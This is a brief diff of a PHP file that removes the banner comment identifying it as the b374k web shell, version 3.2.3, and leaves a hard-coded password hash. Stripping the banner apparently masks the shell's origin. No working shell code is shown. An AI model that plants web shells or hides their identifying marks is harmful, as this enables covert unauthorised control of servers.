@@ -1,9 +1,5 @@
 <?php
 /*
-	b374k shell 3.2.3
-	Jayalah Indonesiaku
-	(c)2021
-	https://github.com/b374k/b374k
 
 */
 $GLOBALS['pass'] = "90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad"; // sha1(md5(pass))
